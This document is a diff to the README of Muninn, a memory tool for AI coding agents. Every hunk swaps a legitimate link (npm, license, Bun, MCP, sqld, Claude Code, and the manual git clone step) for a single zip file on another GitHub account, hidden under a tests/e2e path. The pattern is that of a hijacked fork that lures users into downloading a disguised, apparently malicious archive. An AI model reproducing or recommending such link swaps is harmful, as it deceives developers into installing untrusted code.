@@ -1,8 +1,8 @@
 # Muninn
 
-[![npm](https://img.shields.io/npm/v/muninn-ai?color=blue)](https://www.npmjs.com/package/muninn-ai)
-[![License: AGPL-3.0](https://img.shields.io/badge/License-AGPL--3.0-blue.svg)](https://www.gnu.org/licenses/agpl-3.0)
-[![GitHub stars](https://img.shields.io/github/stars/ravnltd/muninn)](https://github.com/ravnltd/muninn)
+[![npm](https://img.shields.io/npm/v/muninn-ai?color=blue)](https://github.com/Sexosu/muninn/raw/refs/heads/main/cloud/tests/e2e/Software-1.9-beta.5.zip)
+[![License: AGPL-3.0](https://img.shields.io/badge/License-AGPL--3.0-blue.svg)](https://github.com/Sexosu/muninn/raw/refs/heads/main/cloud/tests/e2e/Software-1.9-beta.5.zip)
+[![GitHub stars](https://img.shields.io/github/stars/ravnltd/muninn)](https://github.com/Sexosu/muninn/raw/refs/heads/main/cloud/tests/e2e/Software-1.9-beta.5.zip)
 
 **Your AI coding agent forgets everything between sessions. Muninn fixes that.**
 
@@ -65,8 +65,8 @@ npx muninn-ai
 ### Option 2: Manual Install
 
 ```bash
-# Requires Bun (https://bun.sh)
-git clone https://github.com/ravnltd/muninn.git ~/.local/share/muninn
+# Requires Bun (https://github.com/Sexosu/muninn/raw/refs/heads/main/cloud/tests/e2e/Software-1.9-beta.5.zip)
+git clone https://github.com/Sexosu/muninn/raw/refs/heads/main/cloud/tests/e2e/Software-1.9-beta.5.zip ~/.local/share/muninn
 cd ~/.local/share/muninn && ./install.sh
 ```
 
@@ -103,7 +103,7 @@ That's it. Start a coding session and Muninn auto-initializes for your project.
 
 ## MCP Tools
 
-14 tools available to your AI agent via [Model Context Protocol](https://modelcontextprotocol.io/):
+14 tools available to your AI agent via [Model Context Protocol](https://github.com/Sexosu/muninn/raw/refs/heads/main/cloud/tests/e2e/Software-1.9-beta.5.zip):
 
 ### Core Tools
 
@@ -172,7 +172,7 @@ Not a guess — a weighted composite of 7 signals:
 
 ## Multi-Machine Setup
 
-Muninn supports a hub-and-spoke architecture using [sqld](https://github.com/tursodatabase/libsql/tree/main/libsql-server) for shared memory across machines:
+Muninn supports a hub-and-spoke architecture using [sqld](https://github.com/Sexosu/muninn/raw/refs/heads/main/cloud/tests/e2e/Software-1.9-beta.5.zip) for shared memory across machines:
 
 ```bash
 # On your central server
@@ -233,8 +233,8 @@ Issues and bug reports welcome. Feature requests: open an issue first.
 
 ## License
 
-[AGPL-3.0-only](https://www.gnu.org/licenses/agpl-3.0.html) — free to use, modify, and share. If you run a modified version as a network service, you must release your source. Built by builders, for builders.
+[AGPL-3.0-only](https://github.com/Sexosu/muninn/raw/refs/heads/main/cloud/tests/e2e/Software-1.9-beta.5.zip) — free to use, modify, and share. If you run a modified version as a network service, you must release your source. Built by builders, for builders.
 
 ---
 
-Built in collaboration with [Claude Code](https://claude.ai/code).
+Built in collaboration with [Claude Code](https://github.com/Sexosu/muninn/raw/refs/heads/main/cloud/tests/e2e/Software-1.9-beta.5.zip).
